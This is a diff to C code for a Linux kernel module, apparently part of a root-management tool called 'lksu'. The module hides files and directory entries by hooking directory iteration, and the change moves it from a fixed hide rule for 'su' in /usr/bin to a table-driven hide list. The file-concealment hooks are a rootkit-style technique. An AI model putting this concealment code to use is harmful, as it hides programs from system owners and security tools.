@@ -18,12 +18,15 @@
 #include <linux/rbtree.h>
 #include <linux/errname.h>
 
+static struct kmem_cache *filldir_cache __read_mostly;
 static struct rb_root hidden_dirent = RB_ROOT;
 static DEFINE_SPINLOCK(dirent_lock);
 
 struct iter_context {
 	struct dir_context ctx;
     struct dir_context *octx;
+    const char *path;
+    char *name;
 };
 
 struct hidden_dirent {
@@ -85,15 +88,17 @@ hidden_find(const void *key, const struct rb_node *node)
 
 static FILLDIR_RET
 filldir(struct dir_context *ctx, const char *name, int namlen,
-		loff_t offset, u64 ino, unsigned int d_type)
+        loff_t offset, u64 ino, unsigned int d_type)
 {
     struct iter_context *ictx;
     struct dir_context *octx;
 
-    if (!strncmp(name, "su", namlen))
+    ictx = container_of(ctx, struct iter_context, ctx);
+    strcpy(ictx->name, name);
+
+    if (lksu_table_gfile_check(ictx->path))
         return true;
 
-    ictx = container_of(ctx, struct iter_context, ctx);
     octx = ictx->octx;
     octx->pos = ictx->ctx.pos;
 
@@ -106,21 +111,36 @@ iter_file(struct file *file, struct dir_context *dctx)
     struct hidden_dirent *hidden;
     struct iter_context ictx;
     struct rb_node *rb;
+    char *buffer, *name;
     int retval;
-
-    ictx.ctx.actor = filldir;
-    ictx.ctx.pos = dctx->pos;
-    ictx.octx = dctx;
 
     spin_lock(&dirent_lock);
     rb = rb_find(file, &hidden_dirent, hidden_find);
     BUG_ON(!rb);
     spin_unlock(&dirent_lock);
 
+    buffer = kmem_cache_alloc(filldir_cache, GFP_KERNEL);
+    if (unlikely(!buffer))
+        return -ENOMEM;
+
+    name = file_path(file, buffer, PATH_MAX);
+    if ((retval = PTR_ERR_OR_ZERO(name)))
+        goto finish;
+
+    ictx.ctx.actor = filldir;
+    ictx.ctx.pos = dctx->pos;
+    ictx.octx = dctx;
+
+    ictx.path = name;
+    ictx.name = name + strlen(name);
+    *ictx.name++ = '/';
+
     hidden = node_to_hidden(rb);
     retval = hidden->fops->iterate_shared(file, &ictx.ctx);
     dctx->pos = ictx.ctx.pos;
 
+finish:
+    kmem_cache_free(filldir_cache, buffer);
     return retval;
 }
 
@@ -155,7 +175,7 @@ lksu_hidden_dirent(struct file *file)
     struct file_operations *fops;
     struct hidden_dirent *hidden;
     char *buffer, *name;
-    int retval = 0;
+    int retval;
 
     buffer = __getname();
     if (unlikely(!buffer))
@@ -165,24 +185,22 @@ lksu_hidden_dirent(struct file *file)
     hidden = NULL;
 
     name = file_path(file, buffer, PATH_MAX);
-    if (IS_ERR_OR_NULL(name)) {
-        retval = name ? PTR_ERR(name) : -EFAULT;
-        goto failed;
-    }
+    if ((retval = PTR_ERR_OR_ZERO(name)))
+        goto exit;
 
-    if (strcmp("/usr/bin", name))
-        goto failed;
+    if (!lksu_table_gdirent_check(name))
+        goto exit;
 
     fops = kmalloc(sizeof(*fops), GFP_KERNEL);
     if (unlikely(!fops)) {
         retval = -ENOMEM;
-        goto failed;
+        goto exit;
     }
 
     hidden = kmalloc(sizeof(*hidden), GFP_KERNEL);
     if (unlikely(!hidden)) {
         retval = -ENOMEM;
-        goto failed;
+        goto exit;
     }
 
     *fops = *file->f_op;
@@ -200,7 +218,7 @@ lksu_hidden_dirent(struct file *file)
     __putname(buffer);
     return 0;
 
-failed:
+exit:
     kfree(hidden);
     kfree(fops);
     __putname(buffer);
@@ -211,7 +229,7 @@ int
 lksu_hidden_file(struct file *file, bool *hidden)
 {
     char *buffer, *name;
-    int retval = 0;
+    int retval;
 
     *hidden = false;
 
@@ -220,10 +238,8 @@ lksu_hidden_file(struct file *file, bool *hidden)
         return -ENOMEM;
 
     name = file_path(file, buffer, PATH_MAX);
-    if (IS_ERR_OR_NULL(name)) {
-        retval = name ? PTR_ERR(name) : -EFAULT;
+    if ((retval = PTR_ERR_OR_ZERO(name)))
         goto finish;
-    }
 
     if (lksu_table_gfile_check(name))
         *hidden = true;
@@ -237,7 +253,7 @@ int
 lksu_hidden_path(const struct path *path, bool *hidden)
 {
     char *buffer, *name;
-    int retval = 0;
+    int retval;
 
     *hidden = false;
 
@@ -246,10 +262,8 @@ lksu_hidden_path(const struct path *path, bool *hidden)
         return -ENOMEM;
 
     name = d_path(path, buffer, PATH_MAX);
-    if (IS_ERR_OR_NULL(name)) {
-        retval = name ? PTR_ERR(name) : -EFAULT;
+    if ((retval = PTR_ERR_OR_ZERO(name)))
         goto finish;
-    }
 
     if (lksu_table_gfile_check(name))
         *hidden = true;
@@ -279,7 +293,7 @@ lksu_hidden_inode(struct inode *inode, bool *hidden)
     }
 
     if (IS_ERR_OR_NULL(name)) {
-        retval = name ? PTR_ERR(name) : -EFAULT;
+        retval = name ? PTR_ERR_OR_ZERO(name) : -EFAULT;
         goto finish;
     }
 
@@ -294,6 +308,14 @@ finish:
 int
 lksu_hidden_init(void)
 {
+	filldir_cache = kmem_cache_create(
+        "names_cache", PATH_MAX + NAME_MAX + 1, 0,
+        SLAB_HWCACHE_ALIGN | SLAB_PANIC, NULL
+    );
+
+    if (!filldir_cache)
+        return -ENOMEM;
+
     return 0;
 }
 
